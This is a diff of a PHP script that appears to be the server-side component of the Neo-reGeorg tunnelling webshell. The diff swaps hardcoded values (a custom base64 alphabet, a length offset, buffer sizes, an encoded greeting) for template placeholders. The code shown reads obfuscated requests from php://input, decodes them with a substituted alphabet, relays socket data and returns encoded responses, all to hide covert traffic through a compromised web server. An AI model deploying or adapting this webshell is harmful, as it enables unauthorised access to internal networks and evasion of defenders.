@@ -4,7 +4,7 @@ ini_set("allow_url_include", true);
 ini_set('always_populate_raw_post_data', -1);
 error_reporting(E_ERROR | E_PARSE);
 
-if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);
+if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
 function blv_decode($data) {
     $data_len = strlen($data);
@@ -13,7 +13,7 @@ function blv_decode($data) {
     while ( $i < $data_len) {
         $d = unpack("c1b/N1l", substr($data, $i, 5));
         $b = $d['b'];
-        $l = $d['l'] - 1966546385;
+        $l = $d['l'] - BLV_L_OFFSET;
         $i += 5;
         $v = substr($data, $i, $l);
         $i += $l;
@@ -28,7 +28,7 @@ function blv_encode($info) {
     $info[39] = randstr();
 
     foreach($info as $b => $v) {
-        $l = strlen($v) + 1966546385;
+        $l = strlen($v) + BLV_L_OFFSET;
         $data .= pack("c1N1", $b, $l);
         $data .= $v;
     }
@@ -55,12 +55,12 @@ $REDIRECTURL   = 8;
 $FORCEREDIRECT = 9;
 
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-$de = "dhULNVGsuAk/MxH6ibjcEfRqDWYznXBe9Pl7+SKoZ8pJaICgrQO0mF21yv345wtT";
+$de = "BASE64 CHARSLIST";
 
 $post_data = file_get_contents("php://input");
-if (0 == 1) {
-    $post_data = substr($post_data, 0);
-    $post_data = substr($post_data, 0, -0);
+if (USE_REQUEST_TEMPLATE == 1) {
+    $post_data = substr($post_data, START_INDEX);
+    $post_data = substr($post_data, 0, -END_INDEX);
 }
 $info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
 $rinfo = array();
@@ -118,7 +118,7 @@ switch($cmd){
                     }
                 }
                 stream_set_blocking($res, false);
-                while ($o = fgets($res, 513)) {
+                while ($o = fgets($res, READBUF)) {
                     if($o === false)
                     {
                         @session_start();
@@ -127,7 +127,7 @@ switch($cmd){
                         return;
                     }
                     $readBuff .= $o;
-                    if ( strlen($readBuff) > 524288 ) {
+                    if ( strlen($readBuff) > MAXREADSIZE ) {
                         break;
                     }
                 }
@@ -196,7 +196,7 @@ switch($cmd){
     }
 }
 if ( $sayhello ) {
-    echo base64_decode(strtr("6UNI/jhLR7X7fqPmY+m0BofOMNXNbVV2XNbiEVEODRxUbshHWKXC/mQWx0SNYVDFx1bKY0VDjcS3RcS/nGIOzVA0XOdI/cy=", $de, $en));
+    echo base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en));
 } else {
     echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
 }
